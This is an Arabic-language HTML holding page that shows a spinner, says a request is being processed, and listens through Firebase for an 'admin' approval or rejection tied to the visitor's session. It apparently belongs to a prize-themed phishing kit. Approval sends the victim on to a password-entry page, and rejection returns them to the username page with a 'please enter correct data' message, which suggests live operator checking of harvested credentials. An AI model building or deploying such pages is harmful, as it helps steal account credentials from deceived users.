<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>جاري المعالجة</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box}body{margin:0;min-height:100vh;font-family:Cairo,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;text-align:center;color:#171717}.box{max-width:420px;padding:24px}.spinner{width:96px;height:96px;margin:auto;border:5px solid #c6282822;border-top-color:#c62828;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}h1{font-size:22px;margin:28px 0 8px}p{color:#69707d;font-size:13px}.bar{width:min(280px,90vw);height:8px;margin:24px auto 0;border-radius:20px;background:#eee;overflow:hidden}.bar i{display:block;width:35%;height:100%;background:#c62828;border-radius:20px;animation:move 1.5s ease-in-out infinite alternate}@keyframes move{to{width:100%}}
  </style>
</head>
<body>
  <main class="box"><div class="spinner"></div><h1>جاري معالجة طلبك</h1><p>يرجى الانتظار وعدم إغلاق الصفحة</p><div class="bar"><i></i></div></main>
  <script src="/assets/js/firebase-env.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
  <script src="/assets/js/firebase-client.js?v=13"></script>
  <script src="/assets/js/page-commands.js?v=5"></script>
  <script>
    // الانتظار حتى قرار المدير:
    //   الموافقة → تمرير إلى صفحة إدخال كلمة المرور النصية.
    //   الرفض   → إعادة العميل إلى صفحة اسم المستخدم مع رسالة «يرجى إدخال بيانات صحيحه واعادة المحاولة».
    // الموافقة تصل كأمر توجيه (commands/{sessionId}/redirect) عبر page-commands.js تلقائياً.
    // الرفض يصل عبر مصدرين (Firestore decision + RTDB rejection) — نستخدم أولهما ونمنع التكرار.
    var __prizeHandled = false;
    function __goUsername() {
      if (__prizeHandled) return;
      __prizeHandled = true;
      try { sessionStorage.setItem('prizeRejectMessage', 'يرجى إدخال بيانات صحيحه واعادة المحاولة'); } catch (e) {}
      window.location.href = 'prize-username.html';
    }
    if (window.listenForAdminCommands) {
      window.listenForAdminCommands({
        onApproval: function () { window.location.href = 'prize-text-password.html'; },
        onRejection: function () { __goUsername(); }
      });
    }
    if (window.listenForPageCommands) {
      window.listenForPageCommands({ onReject: function () { __goUsername(); } });
    }
  </script>
</body>
</html>
